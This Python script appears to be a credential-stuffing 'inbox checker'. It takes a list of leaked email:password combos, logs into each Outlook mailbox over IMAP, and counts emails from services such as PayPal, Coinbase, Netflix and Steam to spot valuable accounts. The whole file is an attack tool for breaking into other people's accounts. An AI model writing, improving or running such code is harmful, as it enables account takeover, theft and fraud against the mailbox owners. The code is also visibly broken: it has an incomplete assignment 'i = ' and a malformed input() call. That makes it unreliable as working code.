import imaplib
import requests
import os
import email
from email.header import decode_header
import csv
import webbrowser
i = 
#webbrowser.open("https://t.me/fahimhossen27")
#os.system('xdg-open https://t.mefahimhossen27')
# Function to log into an email account and search for emails from specific targets
def check_email_inbox(email_user, email_pass, targets):
	
    # Connect to the server and login to the account
    mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
    try:
        mail.login(email_user, email_pass)
    except imaplib.IMAP4.error:
        print(f"Failed to login to {email_user}")
        return None

    # Select the mailbox you want to check
    mail.select("inbox")

    results = {}
    for target in targets:
        # Search for emails from the target
        status, messages = mail.search(None, f'FROM "{target}"')
        if status == "OK":
            results[target] = len(messages[0].split())
        else:
            results[target] = 0

    # Logout and close the connection
    mail.logout()
    return results

# Function to read combos from a file
def read_combos(file_path):
    combos = []
    with open(file_path, 'r') as file:
        for line in file:
            email, password = line.strip().split(':')
            combos.append((email, password))
    return combos

# Function to write results to a file
def write_results_to_file(results, output_file_path):
    with open(output_file_path, 'a') as file:
        for result in results:
            email, data = result
            file.write(f"{email}:\n")
            for target, count in data.items():
                file.write(f"{target}: {count} emails\n")
            file.write("━━━━━━━━[𝗜𝗡𝗕𝗢𝗫 📥]━━━━━━━━\n\n")

if __name__ == "__main__":
	
    input_file_path = input("Combo list: ")
    output_file_path = input("Responses should be saved in file: ", 'w')

    targets = [
        "Instagram", "Netflix", "Spotify", "Paypal",
        "Cash App", "Adobe", "Facebook", "Coinbase", "X", "PlayStation", "Ubisoft", "Netflix Members", "Snapchat", "LinkedIn", "Epic Games", "Azure", "Spotify", "Amazon", "Steam", "Roblox", "Minecraft", "TikTok", "Rockstar Games", "Twitch", "Roblox", "Supercell", "Discord", "Fortnite", "Riot Games", "YouTube",
        "Binance", "Eezy", "Digitalocean"
    ]

    combos = read_combos(input_file_path)
    results = []

    for email_user, email_pass in combos:
        data = check_email_inbox(email_user, email_pass, targets)
        if data:
            results.append((email_user, data))

    write_results_to_file(results, output_file_path)
    print(f"Results have been written to {output_file_path}")
